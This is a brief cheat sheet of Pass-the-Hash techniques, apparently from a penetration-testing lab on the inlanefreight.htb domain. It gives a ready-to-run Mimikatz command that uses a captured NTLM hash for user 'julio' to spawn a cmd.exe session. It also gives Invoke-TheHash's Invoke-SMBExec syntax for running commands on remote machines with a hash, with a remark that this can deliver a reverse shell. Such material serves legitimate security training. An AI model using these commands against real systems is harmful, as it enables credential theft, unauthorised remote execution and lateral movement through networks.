-- -
Pass-the-Hash.
### Mimikatz
```powershell
mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
```
### PowerShell
```powershell
# import the module
Import-Module .\Invoke-TheHash.psd1

# run command on other machine via smb
Invoke-SMBExec -Target <ip> -Domain <domain> -Username <usr> -Hash <hash> -Command <cmd to run> -Verbose

# you can get a reverse shell on the other machine by providing a cmd payload to above command.
```